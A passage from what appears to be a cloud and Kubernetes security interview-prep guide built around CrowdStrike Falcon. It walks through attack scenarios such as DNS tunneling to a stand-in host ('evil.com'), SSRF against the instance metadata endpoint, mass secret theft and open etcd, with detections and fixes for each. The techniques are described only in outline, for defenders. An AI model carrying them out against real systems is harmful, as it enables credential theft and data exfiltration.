> "DNS tunneling is stealthy because DNS is almost never blocked. The attacker encodes data in subdomain labels — something like `base64data.evil.com`. The signals: abnormally high DNS query rate and unusually long subdomain labels. My prevention: NetworkPolicies that restrict egress DNS to CoreDNS only (deny UDP/53 to external IPs), which forces all resolution through the cluster. Any direct external DNS query from a pod is suspicious by itself."

---

## Scenario 15: Cross-Account Role Chaining (3-Hop Attack)

**Situation:** Stolen access keys → AssumeRole across 3 accounts without ExternalId conditions.

**Console Navigation:** CIEM → `CrossAccountRoleChain` → visual graph showing 3-hop path with permissions at each node.

**Prevention:** All cross-account trust policies require `aws:SourceAccount` or `ExternalId` condition. Enforce via SCP.

**Interview Answer:**
> "Cross-account role chaining without conditions is the IAM equivalent of leaving all doors unlocked. The attacker hopped across 3 accounts, gaining more permissions at each hop. CIEM's visual graph made the path obvious. My fix: enforce `aws:SourceAccount` and `ExternalId` on ALL cross-account trust policies via SCP, and use CIEM to identify any trust relationship that doesn't have conditions — those are always a finding."

---

## Scenario 16: eBPF Program Loaded from Container

**Situation:** Attacker loads malicious eBPF program from inside a container to intercept syscalls.

**Console Navigation:**
1. **Detections → IOA**: `PotentialKernelTampering` — eBPF from container
2. Container had `CAP_SYS_ADMIN` or `CAP_BPF` capabilities

**Prevention:** Drop `CAP_SYS_ADMIN` and `CAP_BPF` via KAC. Legitimate eBPF (Cilium, Falcon sensor) runs at node level, never from application containers.

**Interview Answer:**
> "eBPF from inside an application container is always malicious. Legitimate eBPF users — Falcon sensor, Cilium CNI — run at the node level as DaemonSets with explicit privileges. The root cause was `CAP_SYS_ADMIN` or `CAP_BPF` granted to the container. I enforce `drop: ALL` via KAC and PSA restricted profile. If Falcon fires PotentialKernelTampering from an application pod, it's a true positive. Period."

---

## Scenario 17: Secrets Manager Mass Theft via Lambda

**Situation:** Lambda with `secretsmanager:GetSecretValue` on `*` exploited via command injection. 47 secrets exfiltrated in 60 seconds.

**Console Navigation:**
1. **CloudTrail**: `ListSecrets` → 47x `GetSecretValue` in 60s
2. **CIEM**: `UnusedPrivilegeExercised` — this permission was never used before

**Prevention:** Every secret access permission must specify exact ARNs. `ListSecrets` denied for application roles.

**Interview Answer:**
> "47 secrets in 60 seconds — this is what happens when IAM policies use `Resource: *` on Secrets Manager. The Lambda only needed 2 specific secrets. CIEM flagged `UnusedPrivilegeExercised` because this permission pattern was never seen before. My policy: every `GetSecretValue` must specify exact ARNs, `ListSecrets` is denied for all application roles, and I monitor CloudTrail for burst `GetSecretValue` calls as a custom detection."

---

## Scenario 18: EC2 IMDS v1 Credential Theft via SSRF

**Situation:** SSRF vulnerability in web app allows attacker to query IMDS and steal instance role credentials.

**Console Navigation:**
1. **Detections → IOA**: HTTP request to 169.254.169.254 from app process
2. **CloudTrail**: API calls from instance role with external source IP
3. **GuardDuty**: `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS`

**Prevention:** Enforce IMDSv2 (`--http-tokens required`). Deploy IRSA for pod-level AWS access.

**Interview Answer:**
> "SSRF to IMDS is the number one cloud attack vector. IMDSv1 returns credentials with a simple GET — no headers needed. IMDSv2 requires a PUT to get a token first, which SSRF can't do. I enforce IMDSv2 via launch template (`--http-tokens required`), set hop limit to 1 on EKS nodes so containers can't reach IMDS at all, and migrate all workloads to IRSA so no pod depends on instance metadata for credentials."

---

## Scenario 19: etcd Direct Access — Cluster-Wide Secret Extraction

**Situation:** Self-managed K8s cluster with etcd port 2379 open without client cert auth.

**Console Navigation:**
1. **Detections → IOA**: `UnauthorizedAPIAccess.etcd`
2. **Posture → IOM**: etcd accessible without client certificate auth (CRITICAL)

**Prevention:** Mutual TLS on etcd. Port 2379 restricted to API server only. Encrypt etcd at rest.

**Interview Answer:**
> "etcd stores every K8s secret in plain base64 by default. Direct access = full cluster compromise. This only applies to self-managed K8s because managed EKS handles etcd security. I enforce mutual TLS on etcd, restrict port 2379 to the API server's IP only, and enable EncryptionConfiguration with aescbc or kms provider for secrets at rest. CIS Benchmark 1.2.29 specifically covers this."

---

## Scenario 20: Falcon Sensor Coverage Gap (DaemonSet Not Running)

**Situation:** New EKS node group added with taints. Falcon DaemonSet doesn't tolerate them. Coverage drops to 85%.

**Console Navigation:**
1. **Dashboard**: Coverage dropped from 100% to 85%
2. **Assets → Nodes**: 3 nodes show "No Sensor"
3. `kubectl get ds -n falcon-system`: DESIRED: 10, CURRENT: 7

**Fix:** Add `tolerations: [{operator: Exists}]` to DaemonSet. Set up automated EC2↔Falcon API reconciliation.

**Interview Answer:**
> "Coverage gaps are silent killers. If the sensor isn't running, nothing else matters — no detections, no drift prevention, no process trees. When new node groups are added with custom taints, the DaemonSet must tolerate them. I set `tolerations: [{operator: Exists}]` so the sensor runs everywhere. I also run a weekly Python script that compares EC2 instances in the auto-scaling group against Falcon-registered hosts and alerts on any mismatch. 100% coverage is non-negotiable."

---

*End of Part 1 — Continue to Part 2 for Compliance Deep Dive, Interview Q&A Mastery, and Automation Playbooks*
